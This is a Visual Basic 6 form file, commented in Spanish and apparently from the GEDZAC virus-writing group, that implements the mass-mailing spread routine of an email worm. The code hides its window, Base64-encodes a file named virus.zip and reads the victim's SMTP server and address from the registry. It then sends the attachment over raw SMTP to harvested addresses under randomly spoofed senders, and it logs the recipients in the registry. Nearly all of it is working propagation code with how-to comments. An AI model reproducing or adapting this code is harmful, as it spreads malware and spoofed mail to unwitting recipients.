VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3195
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Antes de leer esto, mucho recomendable leerse algo sobre
'sockets por 2 razones:

'1)Ser bueno tener ya una idea para entender mejor
'2)Soy medio bruto pa explicar y lo más seguro es que esto
  'no este bien explicado o entendible

'http://mipagina.cantv.net/numetorl869/asmsockguide_es.html
'http://members.tripod.com/vteforte/sockets.htm
'http://es.tldp.org/Tutoriales/PROG-SOCKETS/prog-sockets/t1.html
'http://members.fortunecity.com/haxprt/articulos/API_Winsock2_Estilo_Berkeley/Declare_Funciones_Winsock/Lista_Declaraciones_Funciones_Winsock.html
'http://www.linuxinfor.com/spanish/man7/socket.html
'http://www.elrincondelprogramador.com/default.asp?pag=articulos%2Fleer.asp&id=2
'http://www.buanzo.com.ar/lin/Sockets1.html

'Estamos usando el winsock en modo de "No Blockeo" o
'asincronico

'FileB64 Variable donde almacenaremos nuestro virus codificado en B64
Dim FileB64 As Variant, Salir As Boolean

Private Sub Form_Load()
'On Error Resume Next

'Vamos a usar los objetos FSO y WS para algunas operaciones
'para los lenguajes que no los soporten, se puede usar la api
'pero ahora por razones de tiempo
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsl = CreateObject("WScript.Shell")

'Verificamos si existe el archivo que vamos a enviar, si no
'salimos
If Dir("C:\virus.zip") = "" Then Unload Me

'si existe lo codificamos en Base64 y lo almacenamos en
'FileB64
FileB64 = B64("C:\virus.zip")

'Preparamos para enviar los mails
'Iniciamos un bucle para esperar que la pc este conectada
'a internet, cuando queramos salir del bucle, igualamos Salir
'a true
Salir = False

Do
DoEvents
If Salir = True Then Exit Do
'La funcion IState nos indica si estamos conectados a
'internet
If IState() = True Then Salir = True: Call PreparaEnvioDeMail
Loop
End Sub

'funcion para leer el registro
Function Rr(R): On Error Resume Next: Rr = wsl.RegRead(R): End Function

'sub para escribir el registro
Sub Rw(R, k, t): On Error Resume Next
If t = "" Then wsl.RegWrite R, k Else wsl.RegWrite R, k, "REG_DWORD"
End Sub

Private Sub PreparaEnvioDeMail()
On Error Resume Next
'Tratamos de obtener el server smtp y el correo configurado
'en la pc, por ejemplo los que proporcionar el proovedor
'de servicios de internet (ISP)
Dim ServerSmtp As String, Correo As String

'Leemos el reg para obtener la informacion
ServerSmtp = Rr("HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000001\SMTP Server")
Correo = Rr("HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000001\SMTP Email Address")

'Hacemos algunas comprobaciones para verificar que el server
'smtp y el correo configurado sea valido, porque hay gente
'que no usa el correo de su isp, sino hotmail o cualquiera
'de esos y cuando el win o el Outlook le pide el correo pa
'configurar, le meten cualquier cosa o es una pc de Ciber
'que no tiene esos datos o sabe Dios
If (ServerSmtp <> "") And (Len(ServerSmtp) > 5) And (InStr(ServerSmtp, ".") <> 0) And (IsMail(Correo) = True) Then

'si son validos le pasa al sub los parametro en este
'orden: EnviarMail <ServerSmtp> <ArchivoCorreo> <CorreoDelUsuario>
'<ArchivoCorreo>=archivo txt donde el virus debe haber
'guardado los mails que encontro en el equipo y a los cuales
'se enviara, en este caso los almacena en un file, pudiendo
'conservarlos solo en memoria, en una var, o array, como guste
'el programador
EnviarMail ServerSmtp, "C:\correo.txt", Correo

'si no habia un server smtp o correo configurado en la pc
'podemos usar algunos que permita relay o el de hotmail o
'latinmail (pero en ese caso solo enviariamos a los
'correos de hotmail o al de latinmail)
Else

'RaMFrom("user@dominio.com") nos devuelve un remitente falso
'de una lista, con el dominio indicado
EnviarMail "mail.hotmail.com", "C:\correo.txt", RaMFrom("user@hotmail.com")
EnviarMail "mx1.latinmail.com", "C:\correo.txt", RaMFrom("user@latinmail.com")
End If

End Sub

Private Sub EnviarMail(Smtp As String, fmail As String, umail As String)
On Error Resume Next

'leemos el archivo donde estan guardados los correos
'a los que nos enviaremos, almacenamos lo leido en M2
Set M1 = fso.OpenTextFile(fmail): M2 = M1.ReadAll: M1.Close

'Pasamos los datos de M2 a un Array M3, para que sea
'manejable
M3 = Split(M2, vbCrLf)

'la funcion StartWinsock() inicializa el Winsock, si hay error
'devuelve False y salimos
If Not (StartWinsock()) Then Exit Sub

'Creamos un gancho o hook para recibir los mensages de
'windows que nesecitaremos
Call Hook(Form1.hWnd)

'Declaramos Temp como variant
Dim Temp As Variant

'Progreso de la transaccion a 0
Progress = 0

'No hay error aun, a false
do_cancel = False
   
'si la var mysock diferente de 0, cerramos el socket
'y la igualamos a 0
    If mysock <> 0 Then closesocket (mysock): mysock = 0
        
'LLamamos a la funcion ConnectSock para conectar al server
'smtp, le pasamos la url o ip del server y el handle del
'form1, igualara mysock al numero de socket que usaremos
'para conectar al server smtp
Temp = ConnectSock(Smtp, Form1.hWnd)
    
'si devuelve error entonces llamamos a ExitSmtp
'y luego salimos
    If Temp = INVALID_SOCKET Then ExitSmtp: Exit Sub
    
'llamamos a bSmtpProgress para esperar a que conecte
'si Progress no es igual a 1 en cierto tiempo
'algo fallo y salimos
If Not (bSmtpProgress(1)) Then ExitSmtp: Exit Sub

'Ya conectamos
'llamamos a bSmtpProgress1 y le pasamos el numero que
'esperamos sea la respuesta del server, si en determinado
'tiempo el server no nos da la respuesta que esperamos o
'nos da otra, bSmtpProgress1 devuelve false y salimos
If Not (bSmtpProgress1(220)) Then ExitSmtp: Exit Sub

'El servicio smtp esta diponible, entonces saludamos al
'server, para empezar las transacciones
'con SendData enviamos datos al server por el socket
    Call SendData(mysock, "HELO gedzac.com" & vbCrLf)

'Esperamos que el server nos confirme el saludo con un 250
'sino salimos
If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub
    
'luego iniciamos un bucle for para enviar el virus a todos
'los correos del array
For i = 0 To UBound(M3)

'verificamos con la funcion IsMail() si el mail al que vamos
'a enviar es valido(osea si tiene @, punto, etc.)
'si es valido devuelve true
'verificamos con IsMReg() si ya hemos enviado el virus
'a esa direc, si no hemos enviado devuelve true
'y lo escribe en el reg para ya no enviar a ese mismo
'correo
If (IsMail(M3(i))) And (IsMReg(M3(i))) Then
    
'enviamos el mail from
    Call SendData(mysock, "mail from:" + Chr(32) + "<" + Correo + ">" + vbCrLf)

'esperamos que el server nos confirme con un 250, sino salimos
If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub

'enviamos el rcpt to
    Call SendData(mysock, "RCPT TO:<" & M3(i) & ">" & vbCrLf)
    
'esperamos que el server nos confirme con un 250, sino salimos
If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub
    
'enviamos el comando DATA
   Call SendData(mysock, "DATA" & vbCrLf)
    
'esperamos que el server nos de 354, sino salimos
If Not (bSmtpProgress1(354)) Then ExitSmtp: Exit Sub

'llamamos a IEML que nos devuelve el msg en formato
'mime con asunto, contenido y el virus adjunto
'y lo enviamos, a IEML le pasamos el correo al que vamos
'a enviar para que construya el msg en formato mime
    Call SendData(mysock, IEML(M3(i)) & vbCrLf & vbCrLf & "." & vbCrLf)
                
'esperamos un 250, sino salimos
If Not (bSmtpProgress1(250)) Then ExitSmtp: Exit Sub
    
End If

'pasamos al siguiente correo
Next

'si ya terminamos de enviar y salimos del bucle
'enviamos quit para cerrar conexion
    Call SendData(mysock, "QUIT" & vbCrLf)
    
'esperamos un 221 del server, sino salimos
If Not (bSmtpProgress1(221)) Then ExitSmtp: Exit Sub

'cerramos el socket e igualamos mysock a 0
Call closesocket(mysock): mysock = 0

'terminamos el hook o gancho que hicimos antes
Call UnHook(Form1.hWnd)

'terminamos nuestra secion con el Winsock
Call EndWinsock

End Sub

Function IEML(mail)
On Error Resume Next
Dim eb0 As String, eb00 As String, eb000 As String, rfm As String

'obtiene una direc del mismo dominio que el destinatario
'para falsear el remitente, (campo From:)
rfm = RaMFrom(mail)

'el asunto
eb0 = "Asunto"

'el contenido del msg
eb00 = "Mensage del mail"

'el nombre del adjunto
eb000 = "virus.zip"


'las partes del msg en mime
ctmime = "Content-Type: application/octet-stream;" & vbCrLf & _
Chr(9) & "Name=" & Chr(34) & eb000 & Chr(34) & vbCrLf & "Content-Disposition: attachment;" & vbCrLf & _
Chr(9) & "filename=" & Chr(34) & eb000 & Chr(34) & vbCrLf

Boundary = "----=_NextPart_000_0002_01BD22EE.C1291DA0"
IEML = "From: " & Chr(34) & rfm & Chr(34) & " <" & rfm & ">" & vbCrLf & _
"Subject: " & eb0 & vbCrLf & "DATE:" & Chr(32) & Format(Date, "Ddd") & ", " & Format(Date, "dd Mmm YYYY") & " " & Format(Time, "hh:mm:ss") & vbCrLf & _
"MIME-Version: 1.0" & vbCrLf & "Content-Type: multipart/mixed;" & vbCrLf & _
Chr(9) & "boundary=" & Chr(34) & Boundary & Chr(34) & vbCrLf & _
"X-Priority: 3" & vbCrLf & "X-MSMail - Priority: Normal" & vbCrLf & _
"X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000" & vbCrLf & "" & vbCrLf & _
"Esto es un mensaje multiparte en formato MIME" & vbCrLf & "" & vbCrLf & _
"--" & Boundary & vbCrLf & "Content-Type: text/html;" & vbCrLf & _
Chr(9) & "charset=" & Chr(34) & "x-user-defined" & Chr(34) & vbCrLf & _
"Content-Transfer-Encoding: 8bit" & vbCrLf & "" & vbCrLf & eb00 & vbCrLf & "" & vbCrLf & _
"--" & Boundary & vbCrLf & ctmime & "Content-Transfer-Encoding: base64" & vbCrLf & "" & vbCrLf & _
FileB64 & vbCrLf & "" & vbCrLf & "--" & Boundary & "--"
End Function

'funcion que devuelve un correo falso del mismo dominio
'del mail que se le pase como argumento, el correo falso
'se construye de una lista de nombres, apellidos, numeros
Function RaMFrom(mail)
On Error Resume Next
Dim Rb As Integer, R As Integer
An = Array("Andrea", "Pamela", "Patricia", "Cristina", "Adriana", _
"Katherine", "July", "Vanessa", "Jennifer", "Karina", _
"Janeth", "Dulce", "Ana", "Veronica", "Paola", _
"Carlos", "Marcos", "Javier", "Miguel", "Jorge", _
"Cris", "Willy", "Pablo", "Roberto", "Rodrigo", _
"Enrique", "Luis", "Daniel", "Bill", "Alejandro")

Ap = Array("Dark", "Bracho", "Torres", "Aguilar", "Martinez", _
"Lugo", "Costa", "Velarde", "Varela", "Helsim", _
"Valencia", "Mancilla", "Braschi", "Wong", "Chang", _
"Mora", "Arana", "Alvites", "Start", "Toledo", _
"Flores", "Garcia", "Orellana", "Hoyos", "Perez", _
"Campos", "Humala", "Alvarez", "Valenzuela", "Luque")

Randomize: Rb = Int(Rnd * 200): R = Int(Rnd * 2) + 1
a = Int(Rnd * 30): b = Int(Rnd * 30): ud = Mid(mail, InStr(mail, "@"))

If R = 1 Then
RaMFrom = An(a) & Ap(b) & "_" & Rb & ud
ElseIf R = 2 Then
RaMFrom = An(a) & "_" & Ap(b) & Rb & ud
End If
End Function

'funcion pa codificar un file en Base64
Public Function B64(ByVal vsFullPathname)
On Error Resume Next
Dim b           As Integer: Dim Base64Tab  As Variant
Dim bin(3)      As Byte: Dim s, sResult As String: Dim l, i, FileIn, n As Long
        
Base64Tab = Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/")
    
Erase bin: l = 0: i = 0: FileIn = 0: b = 0: s = "": FileIn = FreeFile
    
Open vsFullPathname For Binary As FileIn
sResult = s & vbCrLf: s = "": l = LOF(FileIn) - (LOF(FileIn) Mod 3)
For i = 1 To l Step 3

Get FileIn, , bin(0): Get FileIn, , bin(1): Get FileIn, , bin(2)
        
If Len(s) > 64 Then
s = s & vbCrLf: sResult = sResult & s: s = ""
End If

b = (bin(n) \ 4) And &H3F: s = s & Base64Tab(b)
b = ((bin(n) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
s = s & Base64Tab(b): b = ((bin(n + 1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
s = s & Base64Tab(b): b = bin(n + 2) And &H3F: s = s & Base64Tab(b)
Next i

If Not (LOF(FileIn) Mod 3 = 0) Then
For i = 1 To (LOF(FileIn) Mod 3)
Get FileIn, , bin(i - 1)
Next i
If (LOF(FileIn) Mod 3) = 2 Then
b = (bin(0) \ 4) And &H3F: s = s & Base64Tab(b)
b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
s = s & Base64Tab(b): b = ((bin(1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
s = s & Base64Tab(b): s = s & "="
Else
b = (bin(0) \ 4) And &H3F: s = s & Base64Tab(b)
b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
s = s & Base64Tab(b): s = s & "=="
End If
End If

If s <> "" Then
s = s & vbCrLf: sResult = sResult & s
End If
s = ""
Close FileIn: B64 = sResult
End Function

'funcion que comprueba la conexion a internet, si hay conex
'devuelve true, sino false
Function IState() As Boolean
On Error Resume Next: IState = IIf(InternetGetConnectedState(0&, 0&) <> 0, True, False)
If Err Then IState = True
End Function

'comprueba si ya se envio el virus al correo que se le pasa
'como argumento, si no se envio a ese correo, devuelve true
'y lo escribe en el registro
Function IsMReg(M) As Boolean
On Error Resume Next: Dim M1 As String
M1 = Rr("HKEY_LOCAL_MACHINE\Software\GEDZAC LABS\VBS.Israfel\Mail\" & M)
If M1 = "" Then
IsMReg = True
Rw "HKEY_LOCAL_MACHINE\Software\GEDZAC LABS\VBS.Israfel\Mail\" & M, "G", ""
Else
IsMReg = False
End If
End Function

'comprueba que el correo que se le pasa sea valido
Function IsMail(ML)
On Error Resume Next: Dim R(20)
R(0) = "/": R(1) = "\": R(2) = "?": R(3) = "="
R(4) = ">"
R(5) = "<": R(6) = Chr(34): R(7) = ";": R(8) = ","
R(9) = Chr(37): R(10) = "¡": R(11) = "¿": R(12) = ")"
R(13) = "(": R(14) = "virus": R(15) = Chr(32): R(16) = ":"
R(17) = "[": R(18) = "]": R(19) = ".."
For k = 0 To 19
If InStr(ML, R(k)) <> 0 Then
IsMail = False
Exit Function
End If
Next
X1 = InStr(ML, "@"): X2 = InStr(ML, ".")
If (X1 <> 0) And (X2 <> 0) And (X1 < X2) Then IsMail = True Else IsMail = False
End Function

'a este sub lo llamabamos en caso de existir algun problema
'en medio del envio de mails y tener que salir
Sub ExitSmtp()
On Error Resume Next
'cierra el socket, e iguala mysock a 0
Call closesocket(mysock): mysock = 0

'termina el gancho iniciado antes
Call UnHook(Form1.hWnd)

'termina la secion de Winsock
Call EndWinsock

'llama nuevamente al sub para enviar mails, con lo que
'podemos volver a conectar y seguir enviando desde donde
'nos quedamos
Call PreparaEnvioDeMail
End Sub

Function Hook(ByVal hWnd As Long)
'usamos SetWindowLong para interceptar los msg
'que windows envia a nuestro form, ya que estamos
'usando el winsock en modo de "No Bloqueo" o asincronico
'necesitamos procesar algunos msgs

'llamamos a SetWindowLong, pasando el handle de nuestro form
'luego la constante que indica que vamos a redirigir los msgs
'que win envia a nuestro form a nuestro propio sub que los
'interceptara, como tercer argumento pasamos el nombre del
'sub a q' se le enviara los msg interceptados osea WindowProc

'en lpPrevWndProc obtenemos la direccion al procedimiento
'original de ventana de nuestro sub, el que estamos reempla
'zando por WindowProc

'Originalmente:
'Windows => procedimiento de ventana del form
'Ahora:
'Windows => Nuestro sub WindowProc => procedimiento de ventana del form
    On Error Resume Next: lpPrevWndProc = SetWindowLong(hWnd, GWL_WNDPROC, AddressOf WindowProc)
End Function

Function UnHook(ByVal hWnd As Long)
'desinterceptamos los msg de windows a nuestro form
'colocando nuevamente el procedimiento origina
'de ventana del form(almacenado en lpPrevWndProc) como al
'que se le enviaran los msg de win
    On Error Resume Next: Call SetWindowLong(hWnd, GWL_WNDPROC, lpPrevWndProc)
End Function
